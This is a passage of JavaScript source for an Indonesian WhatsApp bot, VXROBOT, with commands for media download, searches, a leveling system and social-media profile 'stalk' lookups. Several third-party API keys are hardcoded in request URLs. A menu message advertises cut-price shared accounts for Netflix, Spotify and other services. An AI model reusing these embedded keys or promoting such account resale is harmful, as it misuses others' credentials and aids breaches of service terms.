					filename: `${anu.result.video}.mp4`,
					quoted: mek,
					caption: `${anu.result.title}`
				})
			break

		case 'videoplay':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			//     if (!isRegister) return reply("Kamu Belom Terdaftar Kak!\nketik *!daftarnya* untuk mendaftar")
			if (args.length < 1)
				return reply(
					'Apa Yang Mau Dicari?'
					)
			teks = args.join(
				' ')
			reply(mess.wait)
			if (!teks.endsWith(
					"-doc")) {
				res = await yts(
					`${teks}`
					).catch(
					e => {
						reply
							(
								'_Error Judul Yang Anda Masukan Tidak Ada_')
					})

				reply(
					`♬ Playing ${res.all[0].title} ♬`)
				let thumbInfo = `*Youtube Play Downloader*
               
*Judul* : ${res.all[0].title}
*Type* : mp3
*ID* : ${res.all[0].videoId}
*Publikasi* : ${res.all[0].ago}
*Ditonton* : ${res.all[0].views}
*Durasi* : ${res.all[0].timestamp}
*Channel* : ${res.all[0].author.name}
*Link* : ${res.all[0].author.url}

*_Harap tunggu sebentar*`

				sendFileFromUrl(
					res.all[
						0]
					.image,
					image, {
						quoted: mek,
						thumbnail: gha,
						caption: thumbInfo
					})
				res =
					await y2mateV(
						res.all[
							0]
						.url)
					.catch(
					e => {
						reply
							(
								'_ Error Saat Memasuki Web Y2mate_')
					})
				sendFileFromUrl(
					res[0]
					.link,
					video, {
						quoted: mek,
						mimetype: 'video/mp4',
						filename: res[
								0
								]
							.output
					})
			}
			break
		/*case 'play':

			if (!q) return reply(
				'[BOT]Linknya Mana bwang?'
				)
			buttons = [{
				buttonId: `${prefix}ytmp4 ${q}`,
				buttonText: {
					displayText: `🎥 VIDEO/PID`
				},
				type: 1
			}, {
				buttonId: `${prefix}playyy ${q}`,
				buttonText: {
					displayText: '🎵 LAGU/MUSIC'
				},
				type: 1
			}]
			imageMsg = (
					await varo
					.prepareMessageMedia(
						fs
						.readFileSync(
							`./VXROMD/vxrobot.jpg`
							),
						'imageMessage', {
							thumbnail: fs
								.readFileSync(
									`./VXROMD/vxrobot.jpg`
									)
						}))
				.imageMessage
			buttonsMessage = {
				footerText: 'Dimohon Untuk Tidak Spam Ya Sayang gunakan Dengan Bijak Gausa Kampungan!',
				imageMessage: imageMsg,
				contentText: `Silahkan Pilih Media Yg Akan Di Download kak`,
				buttons,
				headerType: 4
			}
			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					prep)
			break*/
			case 'help':
			case 'menu':
				if (isBanned) return reply(mess.baned)
				list = []
				listmenu = [
					`listharga`,
					`allmenu`,
					`menupremium`,
					`info`,
					`owner`,
					`runtime`,
					`update`
				]
				listmenuu = [
					`APLIKASI PREMIUM`,
					`MENU BOT`,
					`MENU PREMIUM`,
					`INFO BOT`,
					`OWNER BOT`,
					`RUNTIME BOT`,
					`CHANGELOG`
				]
				nombor = 1
				startnum = 0
				for (let x of
						listmenu) {
					const yy = {
						title: 'Silahkan Dipilih' +
							nombor++,
						rows: [
						{
							title: `${listmenuu[startnum++]}`,
							description: ``,
							rowId: `${prefix}${x}`
						}]
					}
					list.push(yy)
				}
				listmsg(from,
					`Haii @${sender.split('@')[0]}\n\nMy name is VXROBOT\nMy prefix is *${prefix}*\n\n*FAQ & Rules*\n1 | *Jangan* telepon bot ini\n\n2 | *Jangan* spam atau kamu akan diblock\n\n3 | Bot ini menggunakan limit 20/hari jadi gunakan dengan bijak\n\n4 | Ada 2 tipe user yaitu *Free* dan *Premium*\n\nTipe Premium adalah tipe berbayar. Kamu bisa menanyakan ke Developer bot tentang member premium.\nketik *${prefix}update* untuk melihat update terbaru\n\nBest regards, @${owner} blbllblblbblblbbblb`,
					`\n\nSilahkan pilih salah satu dibawah ini`,
					list)
				break
				case 'listharga':
					case 'apkpremium':
						reply(`Haii @${sender.split('@')[0]} selamat datang di VXRO STORE~~

Silahkan dilihat dulu dan jika berminat silahkan hubungi @6289516998339

*LIST HARGA APLIKASI PREMIUM*

🌟 NETFLIX
      1 bulan sharing 30K
      1 bulan semi private 40K
      1 bulan private 160K
🌟 WETV
      1 bulan 16K
      1 tahun 25K
🌟 IFLIX
      1 bulan 16K
      1 tahun 25K
🌟 SPOTIFY FAMPLAN AKTIVASI
      1 bulan 15k
      2 bulan 20k
🌟 SPOTIFY FAMPLAN PPJ
      1 bulan 20k
      2 bulan 28k
⛔ SPOTIFY INDPLAN
🌟 VIU
      1 bulan 16K
      6 bulan 25K
🌟 IQIYI
      1 bulan sharing 16K
      1 bulan private 25K
      1 tahun sharing 25K
🌟 YOUTUBE
      1 bulan 12K
⛔ MOLA TV
🌟 DISNEY HOTSTAR
      1 bulan sharing 20K
      3 bulan sharing 35K
               ━━━━━
      1 bulan private 35K
      3 bulan private 70K
🌟 HBO GO 
      1 bulan sharing 30K
      1 bulan private 60K
🌟 HBO MAX
      1 bulan 30K
🌟 PRIME VIDEO
      1 bulan sharing 20K
      1 bulan private 35K
🌟 CRUNCHYROLL
      1 bulan sharing 20K
      1 bulan private 30K
🌟 HULU
      1 bulan sharing 28K
      1 bulan private 40K
🌟 VIDIO 
      1 bulan sharing 20K
      1 bulan private 35K
🌟 DRAKOR.ID
      1 tahun 25K
🌟 APPLE MUSIC
      3 bulan 25K
🌟 RESSO
      1 bulan 20K 
      3 bulan 25K
      1 tahun 45K
🌟 DEEZER
      1 bulan 25K
🌟 CANVA
      1 bulan 12K
      1 tahun 18K
      Lifetime 20K
      Admin Canva Lifetime 60K
🌟 VSCO X
      1 tahun 25K
🌟 REMINI
      1 bulan 20K
🌟 PRESET LIGHTROOM
      500 preset 25K
      1000 preset 35K                 
🌟 GETCONTACT
      1 bulan 25K 
🌟 SCRIB
      1 bulan sharing 18K 
      1 bulan private 25K
🌟 VYPRVPN
     1 tahun 50K 
🌟 GRAMMARLY
     1 bulan sharing 25K 
     1 bulan private 40K
🌟 WATTPAD+
      1 bulan 25K
🌟 G-DRIVE UNLIMITED
      lifetime 25K
	  
*VXRO STORE*
https://chat.whatsapp.com/JN9P1MTMVb09gAtcXfPTxQ`)
break
		/*case 'help':
		case 'menu':

			buttons = [{
				buttonId: `${prefix}listharga `,
				buttonText: {
					displayText: 'APLIKASI PREMIUM'
				},
				type: 1
			}, {
				buttonId: `${prefix}allmenu `,
				buttonText: {
					displayText: `MENU BOT`
				},
				type: 1
			}, {
				buttonId: `${prefix}info `,
				buttonText: {
					displayText: 'INFO BOT'
				},
				type: 1
			}, {
				buttonId: `${prefix}owner `,
				buttonText: {
					displayText: 'OWNER BOT'
				},
				type: 1
			}, {
				buttonId: `${prefix}runtime `,
				buttonText: {
					displayText: 'RUNTIME BOT'
				},
				type: 1
			}]
			imageMsg = (
					await varo
					.prepareMessageMedia(
						fs
						.readFileSync(
							`./VXROMD/vxrobot.jpg`
							),
						'imageMessage', {
							thumbnail: fs
								.readFileSync(
									`./VXROMD/vxrobot.jpg`
									)
						}))
				.imageMessage
			buttonsMessage = {
				footerText: `${fake}`,
				imageMessage: imageMsg,
				contentText: `BOT WHATSAAP`,
				buttons,
				headerType: 4
			}
			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					prep)
			break
		case 'playyy':


			if (args.length ===
				0) return reply(
				`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`
				)
			var srch = args
				.join('')
			aramas = await yts(
				srch);
			aramat = aramas.all
			var mulaikah =
				aramat[0].url
			try {
				yta(mulaikah)
					.then((
						res) => {
							const {
								dl_link,
								thumb,
								title,
								filesizeF,
								filesize
							} =
							res
							axios
								.get(
									`https://api.zeks.me/api/ytmp3?apikey=Ivxro2k21ku&query=${dl_link}`
									)
								.then(
									async (
										a) => {
										if (Number(
												filesize
												) >=
											100000
											)
											return sendMediaURL(
												from,
												thumb,
												`*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
												)
										const
											captions =
											`*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
										sendMediaURL
											(from,
												thumb,
												captions
												)
										await sendMediaURL
											(from,
												dl_link
												)
											.catch(
												() =>
												reply(
													'error'
													)
												)
									})
						})
			} catch (err) {
				reply("Erorr")
			}
			break

		case 'video':
			if (!isPremium)
				return reply(
					mess
					.prem)
			if (args.length < 1)
				return reply(
					'*Masukan judul nya?*'
					)
			reply(
				'Loading.... ')
			acaa = args.join(
				" ")
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytvideo2?query=${acaa}&apikey=vxro2k21`
					)

			if (anu.error)
				return reply(anu
					.error)
			infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
			///////buffer = await getBuffer(anu.result.thumbnail)
			buffer1 =
				await getBuffer(
					anu.result
					.url_video)
			varo.sendMessage(
				from,
				buffer1,
				video, {
					mimetype: 'video/mp4',
					filename: `${anu.result.video}.mp4`,
					quoted: mek,
					caption: 'Nih Gan'
				})
			break*/


		case 'lirik':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk mencari lirik\n\nExample : ${prefix+command} Heat Waves`)
			reply(mess.wait)
            res = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${q}&apikey=BELIAJASONO`)
				let lirik = `Lirik Lagu ${q}

${res.result}
`
				reply(
					lirik)
			break
		case "pinterest":
			if (isBanned) return reply(mess.baned)
			if (!q) return reply(
				`Command untuk mencari gambar dari pinterest\n\nExample : ${prefix+command} Naruto`
				);
			reply(mess.wait)
			let pin = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=vxro2k21&query=${q}`)
			let ac = pin.result
			let di =
				await getBuffer(
					ac);
			await varo
				.sendMessage(
					from, di,
					image, {caption:`*Gambar Pinterest :* ${q}`,
						quoted: mek
					})
					limitAdd(sender,
						limit)
			break;

		case 'wallpaper':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari Wallpaper\n\nExample : ${prefix+command} Game`
				)
			try {
				wall.getAnimeWall2(
					`${body.slice(11)}`
					).then(
					res => {
						getBuffer
							(res[
									0]
								.image
								)
							.then(
								ress =>
								varo
								.sendMessage(
									from,
									ress,
									image, {
										quoted: mek,
										caption: `${res[0].title}`
									}
									)
								)
								limitAdd(sender,
									limit)
					})
			} catch (e) {
				reply(
					`Maaf @${sender.split('@')[0]}, wallpaper yang kamu cari tidak dapat ditemukan`)
			}
			break
		/*case 'pinterest2':
			if (!q) return reply(
				'yg mau di cari apa?'
				)
			pinterest(`${q}`)
				.then(data => {
					const
						amsulah =
						data
						.result
					const
						pimterest =
						amsulah[
							Math
							.floor(
								Math
								.random() *
								amsulah
								.length
								)
							]
					sendMediaURL
						(from,
							pimterest,
							`Pinterest : ${q}`
							)
				})
			break*/

		case 'shopee':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			try {
				if (args
					.length == 0
					) return reply(
						`Command untuk mencari produk dari Shopee\n\nExample : ${prefix+command} Sepatu`
					)
				query = args
					.join(" ")
				reply(mess.wait)
				get_data =
					await fetchJson(
						`https://api.lolhuman.xyz/api/shopee?apikey=vxro2k21&query=${q}`
						)
				get_data =
					get_data
					.result
				teks = `*| SHOPEE PRODUCT |*
\n`
				for (let i =
					0; i <
					get_data
					.length; i++
					) {
					teks +=
						`\`\`\`▷ Nama : ${get_data[i].name}\`\`\`
\`\`\`▷ Harga : Rp.${get_data[i].price}\`\`\`
\`\`\`▷ Terjual : ${get_data[i].sold}\`\`\`
\`\`\`▷ Stok : ${get_data[i].stock}\`\`\`
\`\`\`▷ Lokasi : ${get_data[i].shop_loc}\`\`\`
\`\`\`▷ Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`▷ Link : ${get_data[i].link_produk}\`\`\`\n\n`
				}
            reply(teks)
			limitAdd(sender,
				limit)
			} catch {
				reply(
					`Maaf produk ${q} tidak ditemukan`)
			}
			break
		case 'playstore':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			try {
				if (args
					.length == 0
					) return reply(
						`Command untuk mencari aplikasi dari PlayStore\n\nExample : ${prefix+command} New State`
					)
				query = args
					.join(" ")
				reply(mess.wait)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/playstore?apikey=vxro2k21&query=${q}`
						)
				get_result =
					get_result
					.result
				teks = `*| PLAYSTORE SEARCH |*
				\n`
				for (let i =
					0; i <
					get_result
					.length; i++
					) {
					teks += `\`\`\`▷ Title : ${get_result[i].title}\`\`\`
\`\`\`▷ Developer : ${get_result[i].developer}\`\`\`
\`\`\`▷ Price : ${get_result[i].price}/${get_result[i].priceText}\`\`\`
\`\`\`▷ Rate : ${get_result[i].scoreText}\`\`\`
\`\`\`▷ Link : ${get_result[i].url}\`\`\`

`
				}
				ini_buffer =
					await getBuffer(
						get_result[
							0]
						.icon)
				varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: teks
						})
						limitAdd(sender,
							limit)
			} catch {
				reply(
					`Maaf aplikasi ${query} tidak ditemukan`)
			}
			break
		case 'yts':
		case 'ytsearch':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk mencari video di YouTube\n\nExample : ${prefix+command} Cloud Bread Gustixa`)
			reply(mess.wait)
			try {
				res = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=vxro2k21&query=${q}`)
				a = `*| YOUTUBE SEARCH |*
\n`
				for (let i of
						res
						.result) {
					a += `\`\`\`▷ Title : ${i.title}\`\`\`
\`\`\`▷ Views : ${i.views}\`\`\`
\`\`\`▷ Published : ${i.published}\`\`\`
\`\`\`▷ Link : https://www.youtube.com/watch?v=${i.videoId}\`\`\`\n\n`
				}
				b = a.trim()
				sendFileFromUrl(
					res.result[
						0]
					.thumbnail,
					image, {
						quoted: mek,
						caption: b
					})
					limitAdd(sender,
						limit)
			} catch (e) {
				console.log(e)
				reply(`Error`)
			}
			break
		case 'tourl':
			if (isBanned) return reply(mess.baned)
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedVideo
					) && args
				.length == 0) {
				reply(mess.wait)
				boij =
					isQuotedImage ||
					isQuotedVideo ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await varo
					.downloadMediaMessage(
						boij)
				res =
					await uploadImages(
						owgi)
				reply(res)
			} else {
				reply(`Command untuk mengubah image/video ke url\n\nExample : ${prefix+command} (Reply Image/Vid)`)
			}
			break
		case 'imgtourl':
		case 'img2url':
			if (isBanned) return reply(mess.baned)
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!isQuotedImage) return reply(`Command untuk mengubah image ke url\n\nExample : ${prefix+command} (Reply Image)`)
			reply(mess.wait)
			var imgbb = require(
				'imgbb-uploader'
				)
			var encmedia =
				isQuotedImage ?
				JSON.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo :
				mek
			var media =
				await varo
				.downloadAndSaveMediaMessage(
					encmedia)
			imgbb('39d895963468b814fad0514bd28787e2',
					media)
				.then(data => {
					var caps =
						`*| IMAGE TO URL |*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
					ibb = fs
						.readFileSync(
							media
							)
					varo
						.sendMessage(
							from,
							ibb,
							image, {
								quoted: mek,
								caption: caps
							}
							)
				})
				.catch(err => {
					throw err
				})
			break

		case 'nulis':
		case 'tulis':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk menulis di buku\n\nExample : ${prefix+command} Halo`
					)
			teks = args.join(
				' ')
			reply(mess.wait)
			nulis =
				encodeURIComponent(
					teks)
			res = await axios
				.get(
					`https://dt-04.herokuapp.com/nulis?text=${nulis}`
					)
			if (res.data.error)
				return reply(res
					.data
					.error)
			buff = Buffer.from(
				res.data
				.result
				.split(',')[
					1],
				'base64')
			varo.sendMessage(
				from, buff,
				image, {
					quoted: mek,
					caption: mess
						.success
				})
				limitAdd(sender,
					limit).catch(
				e => {
					return reply(
						'_[ ! ] Error_'
						)
				})
			break
			//------------------< Level >-------------------
		case 'level':
			if (isBanned) return reply(mess.baned)


			let userLevel =
				level
				.getLevelingLevel(
					sender,
					_level)
			let userXp = level
				.getLevelingXp(
					sender,
					_level)
			let requiredXp =
				10 * Math.pow(
					userLevel, 2
					) + 50 *
				userLevel + 100
			let userRank = level
				.getUserRank(
					sender,
					_level)
			try {
				profilePic =
					await varo
					.getProfilePicture(
						sender)
			} catch {
				profilePic =
					errorImg
			}
			buffer =
				await getBuffer(
					`http://api.lolhuman.xyz/api/rank?apikey=vxro2k21&img=${profilePic}&background=https://i.ibb.co/8B6Q84n/LTqHsfYS.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`
					)
			teks =
				`*「 LEVEL 」*\n\n▷ *Nama :* ${pushname}\n▷ *Xp :* ${userXp} / ${requiredXp}\n▷ *Level :* ${userLevel}\n▷ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
			varo.sendMessage(
				from,
				buffer,
				image, {
					caption: teks,
					quoted: mek
				})
			break
		case 'leaderboard': //Cek Leaderboard
		case 'leaderboards':
			if (isBanned) return reply(mess.baned)
			if (!isGroup)
			return reply(
					mess
					.only
					.group)
			if (!isLevelingOn)
				return await reply(
					'Fitur leveling belum diaktifkan!'
					)
			const resp = _level
			_level.sort((a,
				b) => (a
					.xp < b
					.xp) ?
				1 : -1)
			let leaderboard =
				'     *| LEADERBOARD |*\n\n'
			try {
				for (let i =
					0; i <
					10; i++) {
					var roles =
						'Warrior III'
					if (resp[i]
						.level <=
						5) {
						roles =
							'Warrior II'
					} else if (
						resp[i]
						.level <=
						10) {
						roles =
							'Warrior I'
					} else if (
						resp[i]
						.level <=
						15) {
						roles =
							'Elite III'
					} else if (
						resp[i]
						.level <=
						20) {
						roles =
							'Elite II'
					} else if (
						resp[i]
						.level <=
						25) {
						roles =
							'Elite I'
					} else if (
						resp[i]
						.level <=
						30) {
						roles =
							'Master III'
					} else if (
						resp[i]
						.level <=
						35) {
						roles =
							'Master II'
					} else if (
						resp[i]
						.level <=
						40) {
						roles =
							'Master I'
					} else if (
						resp[i]
						.level <=
						45) {
						roles =
							'GrandMaster III'
					} else if (
						resp[i]
						.level <=
						50) {
						roles =
							'GrandMaster II'
					} else if (
						resp[i]
						.level <=
						55) {
						roles =
							'GrandMaster I'
					} else if (
						resp[i]
						.level <=
						60) {
						roles =
							'Epic III'
					} else if (
						resp[i]
						.level <=
						65) {
						roles =
							'Epic II'
					} else if (
						resp[i]
						.level <=
						70) {
						roles =
							'Epic I'
					} else if (
						resp[i]
						.level <=
						75) {
						roles =
							'Legend III'
					} else if (
						resp[i]
						.level <=
						80) {
						roles =
							'Legend II'
					} else if (
						resp[i]
						.level <=
						85) {
						roles =
							'Legend I'
					} else if (
						resp[i]
						.level <=
						90) {
						roles =
							'Mythic'
					} else if (
						resp[i]
						.level <=
						95) {
						roles =
							'Mythical Glory'
					} else if (
						resp[i]
						.level >=
						100) {
						roles =
							'Mythical Glory+++'
					}

					leaderboard
						+=
						`▷ ${i + 1}. @${_level[i].id.replace('@s.whatsapp.net', '')}\n▷ *Xp :* ${_level[i].xp}\n▷ *Level :* ${_level[i].level}\n▷ *Role :* ${roles}\n\n`
					usernyaa = _level[0].id
				}
				/*reply(
					leaderboard)*/
					varo
				.sendMessage(
					from,
					leaderboard,
					text, {contextInfo: { mentionedJid: [`${_level[0].id}`,`${_level[1].id}`,`${_level[2].id}`,`${_level[3].id}`,`${_level[4].id}`,`${_level[5].id}`,`${_level[6].id}`,`${_level[7].id}`,`${_level[8].id}`,`${_level[9].id}`]},
						quoted: mek,
						thumbnail: fakeimage
					})
			} catch (err) {
				console.error(
					err)
				reply(
					'_Perlu setidaknya 10 user yang memiliki level di database!_')
			}
			break
			//------------------< Stalk >-------------------
		case 'stalkgithub':
		case 'githubstalk':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari user dari Github.com\n\nExample : ${prefix+command} Varo-Amv`
				)
			reply(mess.wait)
			username = args[0]
			ini_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/github/${username}?apikey=vxro2k21`
					)
			ini_result =
				ini_result
				.result
			ini_buffer =
				await getBuffer(
					ini_result
					.avatar)
			ini_txt = `*| GITHUB PROFILE |*

\`\`\`▷ Username : ${ini_result.name}\`\`\`
\`\`\`▷ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▷ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▷ Followers : ${ini_result.followers}\`\`\`
\`\`\`▷ Following : ${ini_result.following}\`\`\`
\`\`\`▷ Bio : ${ini_result.bio}\`\`\`
\`\`\`▷ Link : ${ini_result.url}\`\`\`
`
			varo.sendMessage(
				from,
				ini_buffer,
				image, {
					caption: ini_txt,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
				limitAdd(sender,
					limit)
			break
		case 'stalkig':
		case 'igstalk':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari user dari Instagram\n\nExample : ${prefix+command} varo.amv`
				)
			reply(mess.wait)
			username = args[0]
			ini_result =
				await fetchJson(
					`https://api.xteam.xyz/dl/igstalk?nama=${username}&APIKEY=5eafbaf9a68d2fdf`
					)
			ini_result =
				ini_result
				.result
			/*ini_buffer =
				await getBuffer(
					ini_result
					.Profile_pic
					)*/
			ini_txt = `*| INSTAGRAM PROFILE |*

\`\`\`▷ Username : ${ini_result.Username}\`\`\`
\`\`\`▷ Nama : ${ini_result.Name}\`\`\`
\`\`\`▷ Pengikut : ${ini_result.Jumlah_Followers}\`\`\`
\`\`\`▷ Mengikuti : ${ini_result.Jumlah_Following}\`\`\`
\`\`\`▷ Deskripsi : ${ini_result.Biodata}\`\`\`
\`\`\`▷ Link : https://instagram.com/${ini_result.Username}\`\`\`
`
            reply(ini_txt)
			limitAdd(sender,
				limit)
			/*varo.sendMessage(
				from,
				ini_buffer,
				image, {
					caption: ini_txt
				})*/
			break
		case 'stalktiktok':
		case 'tiktokstalk':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari profile user dari TikTok\n\nExample : ${prefix+command} Bulan Sutena`
				)
			reply(mess.wait)
			stalk_toktok = args[
				0]
			get_result =
				await fetchJson(
					`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=vxro2k21`
					)
			get_result =
				get_result
				.result
			pp_tt =
				await getBuffer(
					get_result
					.user_picture
					)
			ini_txt = `*| TIKTOK PROFILE |*

\`\`\`▷ Username : ${get_result.username}\`\`\`
\`\`\`▷ Nama : ${get_result.nickname}\`\`\`
\`\`\`▷ Pengikut : ${get_result.followers}\`\`\`
\`\`\`▷ Mengikuti : ${get_result.followings}\`\`\`
\`\`\`▷ Likes : ${get_result.likes}\`\`\`
\`\`\`▷ Video : ${get_result.video}\`\`\`
\`\`\`▷ Deskripsi : ${get_result.bio}\`\`\`
`
			varo.sendMessage(
				from, pp_tt,
				image, {
					quoted: mek,
					caption: ini_txt,
					thumbnail: Buffer
						.alloc(
							0
							)
				})
				limitAdd(sender,
					limit)
			break

		/*case 'owner3':
			let ini_list = []
			for (let i of
					nomorowner1) {
				const vname =
					varo
					.contacts[
					i] !=
					undefined ?
					varo
					.contacts[i]
					.vname ||
					varo
					.contacts[i]
					.notify :
					undefined
				ini_list.push({
					"displayName": 'ItsMeVall',
					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${varo.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
				})
			}
			hehe = await varo
				.sendMessage(
					from, {
						"displayName": `${ini_list.length} kontak`,
						"contacts": ini_list
					},
					'contactsArrayMessage', {
						quoted: mek
					})
			varo.sendMessage(
				from,
				'Ini Kontak Owner Ku',
				text, {
					quoted: mek
				})
			break
		case 'iguser':
			try {
				if (args
					.length == 0
					) return reply(
					`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`
					)
				query = args
					.join(" ")
				reply(mess.wait)
				get_result =
					await fetchJson(
